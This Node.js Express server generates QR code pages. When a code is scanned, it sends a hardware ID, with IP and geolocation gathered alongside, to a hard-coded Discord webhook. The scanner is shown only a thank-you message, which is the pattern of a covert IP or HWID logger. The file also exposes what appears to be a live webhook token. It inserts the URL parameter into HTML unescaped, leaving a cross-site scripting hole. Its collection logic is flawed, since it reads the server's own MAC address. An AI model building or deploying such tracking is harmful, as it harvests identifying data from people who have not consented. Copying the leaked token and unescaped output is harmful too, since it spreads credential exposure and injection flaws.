const express = require('express');
const QRCode = require('qrcode');
const app = express();
const bodyParser = require('body-parser');
const { default: getMAC } = require('getmac');
const axios = require('axios');
const requestIp = require('request-ip');
const geoip = require('geoip-lite');
const path = require('path');
app.use(express.static(path.join(__dirname, "public")));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));


// Add the requestIp middleware
app.use(requestIp.mw())




// Create an array to store the generated codes and their corresponding data
const codes = [];

// Endpoint to generate a QR code link with the user's HWID and IP address encoded in it

app.get('/qrcode/:code', async (req, res) => {
  const hwid = getMAC();
  const ip = req.clientIp;
  const geo = geoip.lookup(ip);
  const qrCode = req.params.code;
  const qrContent = req.params.description;

  // Store the generated code and its corresponding data in the array
  codes.push({ code: qrCode, hwid: hwid, ip: ip });

  const qrLink = await QRCode.toDataURL(`https://fluidqr.onrender.com/scan/${qrCode}`);
  
  // Define the metadata for the webpage
  const metaTags = `
    <meta property="og:title" content="QR Code for ${qrCode}">
    <meta property="og:image" content="${qrLink}">
    <meta property="og:description" content="${qrContent}">
  `;
  
  res.send(`
    <html>
      <head>
        ${metaTags}
      </head>
      <body>
        <a href="https://fluidqr.onrender.com/scan/${qrCode}" target="_blank">
          <img src="${qrLink}">
        </a>
      </body>
    </html>
  `);
});




// Endpoint to record the user's HWID and IP address when they scan the QR code and send it to a Discord webhook
app.get('/scan/:code', async (req, res) => {
  const qrCode = req.params.code;

  // Find the corresponding data for the scanned code in the array
  const codeData = codes.find(c => c.code === qrCode);

  if (!codeData) {
    return res.status(404).send(`
      <html>
        <body>
          <h1>Code not found</h1>
        </body>
      </html>
    `);
  }

  const hwid = codeData.hwid;
  const ip = codeData.ip;
  const geo = geoip.lookup(ip);

  // Define the embed object
  const embed = {
    title: 'New QR code scan',
    color: 0x00ff00, // Green color
    timestamp: new Date(),
    fields: [
      {
        name: 'HWID',
        value: `\`\`\`${hwid}\`\`\``,
        inline: true,
      },
    ],
  };
  
  
  // Send a message to the Discord webhook with the embed object
  const webhookUrl = 'https://discord.com/api/webhooks/1083180101656641546/M6oICtaPe5S-AWjC1to3XdGLkxdRfN3IxNW9WeL9Bu6qUu_1eIaLQyYZ4KtA3WYMXsKc'; // Replace with your actual webhook URL
  try {
    await axios.post(webhookUrl, {
      embeds: [embed],
    });
    console.log(`Sent message to Discord webhook: ${embed.description}`);
  } catch (error) {
    console.error(`Error sending message to Discord webhook: ${error}`);
  }
  

  // Return a success response to the client
  res.send(`
    <html>
      <body>
        <h1>Thanks for scanning the QR code!</h1>
      </body>
    </html>
  `);
});

// Start the server
app.listen(3000, () => {
  console.log('Server started on port 3000');
});
